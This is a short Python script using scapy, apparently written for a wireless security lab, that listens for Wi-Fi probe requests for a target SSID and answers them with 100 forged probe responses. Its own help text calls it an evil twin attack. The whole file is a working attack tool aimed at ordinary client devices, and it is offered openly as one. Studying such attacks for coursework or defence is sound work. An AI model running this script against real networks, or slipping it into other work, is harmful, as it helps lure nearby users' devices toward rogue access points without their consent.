#!/usr/bin/env python
# Authors : Axel Vallon and Robin Gaudin
# Date : 26.03.2022

from scapy.all import *

def PacketHandler(packet) :
    if packet.haslayer(Dot11ProbeReq):
        # extract the MAC address of the network
        bssid = packet[Dot11].addr2
        # get the name of it
        found_ssid = packet[Dot11Elt].info.decode()
        
        if found_ssid == ssid:
            input_result = input("Found a ssid, do you want to launch an attack ? (Y/N)")
            if input_result == "Y":
                # we build the frame, the unknown mac address are not important there
                dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2="aa:aa:aa:aa:aa:aa", addr3="aa:aa:aa:aa:aa:aa")
                essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
                frame = RadioTap()/dot11/Dot11ProbeResp()/essid
                sendp(frame, inter=0.1, count=100, iface=iface, verbose=0)
                # we deceided to send 100 packet, as it is easier to see them with capture
                print("100 Probe response with SSID", ssid, "have been sent")


if __name__ == '__main__':
    import argparse
    DEFAULT_WLAN = "wlan0"
    parser = argparse.ArgumentParser(description="A python script for creating a probe request evil twin attack with target SSID")
    parser.add_argument("-i", dest="iface", help="Interface to use, must be in monitor mode, default is 'wlan0'", default=DEFAULT_WLAN)
    parser.add_argument("-s", "--ssid", dest="ssid", help="the requested ssid", required=True)
    args = parser.parse_args()
    ssid = args.ssid
    iface = args.iface

    print("Waiting for probe request to", ssid)
    sniff(prn=PacketHandler, iface=iface)

